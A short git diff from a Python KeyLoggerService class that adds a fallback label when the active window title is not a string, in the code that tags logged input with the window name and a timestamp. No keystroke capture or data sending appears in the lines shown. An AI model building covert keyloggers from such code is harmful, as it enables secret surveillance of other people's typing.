@@ -17,7 +17,7 @@ class KeyLoggerService(IKeyLogger):
         active_window = pygetwindow.getActiveWindowTitle()
 
         if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
-            self.__last_record = active_window + ': ' + current_time_formatted
+            self.__last_record = (active_window if isinstance(active_window,str) else 'General window') + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
         self.__last_window = active_window
